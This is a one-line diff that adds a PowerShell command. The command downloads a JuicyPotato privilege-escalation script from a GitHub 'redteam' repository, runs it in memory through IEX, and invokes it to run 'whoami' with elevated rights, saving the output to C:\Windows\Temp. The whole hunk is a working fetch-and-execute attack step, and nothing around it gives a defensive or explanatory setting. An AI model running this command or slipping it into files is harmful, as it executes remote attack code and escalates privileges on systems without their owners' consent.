@@ -1,0 +1,1 @@
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/d0nkeys/redteam/refs/heads/master/privilege-escalation/JuicyPotato.ps1'); Invoke-JuicyPotato -Command "cmd /c whoami > C:\Windows\Temp\out.txt"; Get-Content C:\Windows\Temp\out.txt
